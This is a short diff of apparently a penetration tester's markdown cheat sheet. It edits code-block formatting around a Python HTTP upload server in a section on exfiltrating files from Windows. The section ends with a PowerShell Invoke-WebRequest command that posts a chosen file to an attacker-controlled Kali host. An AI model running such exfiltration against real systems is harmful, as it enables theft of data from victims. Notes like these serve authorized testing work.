@@ -93,7 +93,7 @@ Mount a Windows vhd:
 
 Exfiltrate files off of a Windows system `sudo python3 app.py` (if [updog](https://github.com/sc0tfree/updog) isn't available)
 
-```python group:a
+```python
 #!/usr/bin/env python3
 from http.server import SimpleHTTPRequestHandler, HTTPServer
 import os
@@ -120,10 +120,6 @@ if __name__ == "__main__":
     httpd = HTTPServer(server_address, FileUploadHTTPRequestHandler)
     print(f"Serving HTTP on {server_address[0]} port {server_address[1]} (http://{server_address[0]}:{server_address[1]}/)")
     httpd.serve_forever()
-```
-```python group:a
-from http.server import SimpleHTTPRequestHandler, HTTPServer
-import os
 ```
 
 `Invoke-WebRequest -Uri "http://{kali_IP}:8080/upload" -Method Post -InFile "{filename}" -Headers @{"filename"="{filename}"} -UseBasicParsing`
